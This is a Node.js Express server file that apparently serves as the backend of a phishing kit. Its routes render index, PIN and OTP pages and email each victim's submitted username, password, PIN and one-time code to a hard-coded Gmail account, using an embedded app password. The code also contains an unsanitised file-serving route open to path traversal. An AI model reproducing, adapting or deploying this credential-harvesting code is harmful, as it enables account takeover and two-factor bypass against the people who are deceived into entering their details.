const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

const PORT = process.env.PORT || 5500; // port to connect to WEB

// Middleware
const path = require("path");
const currentDirectory = __dirname;
const publicFolderPath = path.join(currentDirectory, "public");
const platformSpecificPath = path.resolve(publicFolderPath);
app.use(express.static(platformSpecificPath));
app.set("view engine", "ejs");
app.use(express.json());

// api routes

app.get("/files/:filename", (req, res) => {
  const filename = req.params.filename;
  // Construct the path to the requested file
  const filePath = path.join(__dirname, "public", filename);

  // Send the file to the client
  res.sendFile(filePath, (err) => {
    if (err) {
      console.error("Error sending file:", err);
      res.status(err.status).end();
    } else {
      console.log("File sent successfully:", filename);
    }
  });
});

// API routes for index
app.post("/", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "Lordyking322@gmail.com",
      pass: "mqpzrbhppnjljokm",
    },
  });

  const mailOptions = {
    from: email,
    to: "Lordyking322@gmail.com",
    subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for pin
app.post("/pin", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "Lordyking322@gmail.com",
      pass: "mqpzrbhppnjljokm",
    },
  });

  const mailOptions = {
    from: email,
    to: "Lordyking322@gmail.com",
    subject: `PIN: ${req.body?.pin} `,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "Lordyking322@gmail.com",
      pass: "mqpzrbhppnjljokm",
    },
  });

  const mailOptions = {
    from: email,
    to: "Lordyking322@gmail.com",
    subject: `OTP: ${req.body?.otp} `,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

// index
app.get("/", (req, res) => {
  res.render("index");
});
// otp
app.get("/otp", (req, res) => {
  res.render("otp");
});
// pin
app.get("/pin", (req, res) => {
  res.render("pin");
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
